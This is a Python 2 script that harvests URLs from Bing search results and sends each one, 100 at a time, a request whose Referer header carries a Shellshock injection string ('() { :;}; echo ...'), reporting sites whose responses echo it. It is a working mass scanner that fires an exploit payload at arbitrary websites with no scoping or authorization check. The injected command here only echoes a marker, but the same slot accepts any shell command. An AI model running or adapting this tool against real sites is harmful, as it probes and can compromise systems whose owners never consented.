#!/usr/bin/env python

#This must be one of the first imports or else we get threading error on completion
from gevent import monkey
monkey.patch_all()
from gevent.pool import Pool
from gevent import joinall

import urllib
import urllib2
import argparse
import sys
import json
import socket
socket.setdefaulttimeout(60)

__author__ = 'Dan McInerney'
__site__ = 'danmcinerney.org'
__twitter__ = '@danhmcinerney'

VULN_FOUND = None

def parse_args():
   ''' Create the arguments '''
   parser = argparse.ArgumentParser()
   parser.add_argument("-s", "--search", help="Search terms")
   parser.add_argument("-p", "--pages", default="1", help="Number of pages of results to fetch where there's 50 results per page; defaults to 1")
   parser.add_argument("-k", "--key", help="Your Bing API key found at https://datamarket.azure.com/account")
   return parser.parse_args()

def bing_search(query, key, offset, **kwargs):
    ''' Make the search '''
    username = ''
    baseURL = 'https://api.datamarket.azure.com/Bing/Search/'
    query = urllib.quote(query)
    user_agent = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)'
    credentials = (':%s' % key).encode('base64')[:-1]
    auth = 'Basic %s' % credentials
    url = baseURL+'Web?Query=%27'+query+'%27&$top=50&$format=json&$skip='+offset
    print '[*] Fetching '+url
    password_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
    password_mgr.add_password(None, url, username, key)
    handler = urllib2.HTTPBasicAuthHandler(password_mgr)
    opener = urllib2.build_opener(handler)
    urllib2.install_opener(opener)
    try:
        readURL = urllib2.urlopen(url, timeout=60).read()
    except Exception as e:
        sys.exit('[-] Failed to fetch bing results. Are you sure you have the right API key?\n      Error: '+str(e))
    return readURL

def action(result):
    ''' Make the payloaded request and check the response's headers for the echo msg'''
    global VULN_FOUND
    exploit = "() { :;}; echo 'Shellshock: Vulnerable'"
    ua = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0'
    url = result['Url']

    req = urllib2.Request(url)
    req.add_header('User-Agent', ua)
    req.add_header('Referer', exploit)
    try:
        r = urllib2.urlopen(req, timeout=60)
    except Exception as e:
        return
    resp_headers = r.info()
    if 'shellshock' in r.info():
        VULN_FOUND = True
        print '[!] SHELLSHOCK VULNERABLE:', url
    return

def result_concurrency(results):
    ''' Open all the greenlet threads '''
    in_parallel = 100
    pool = Pool(in_parallel)
    jobs = [pool.spawn(action, result) for result in results]
    return joinall(jobs)

def main():
    args = parse_args()
    if not args.search:
        sys.exit('[!] Specify a search term, eg, ./search-bing.py -s "search for this"')
    if not args.key:
        sys.exit('[!] Specify a Bing API key or get one here: https://datamarket.azure.com/dataset/bing/search')
    key = args.key
    if len(key) not in (44, 43):
        sys.exit('[-] Incorrect key length')
    query = args.search
    pages = int(args.pages)
    offset = 0
    total_results = []
    for x in xrange(pages):
        # Start off with offset = 0
        if x != 0:
            offset += 50
        response = bing_search(query, key, str(offset))
        results = json.loads(response)['d']['results']
        if len(results) == 0:
            print '[-] No more results found'
            break
        total_results += results
    print '[*] Checking each search result...'
    result_concurrency(total_results)
    if not VULN_FOUND:
        print '[-] No vulnerable sites found'

if __name__ == "__main__":
    main()
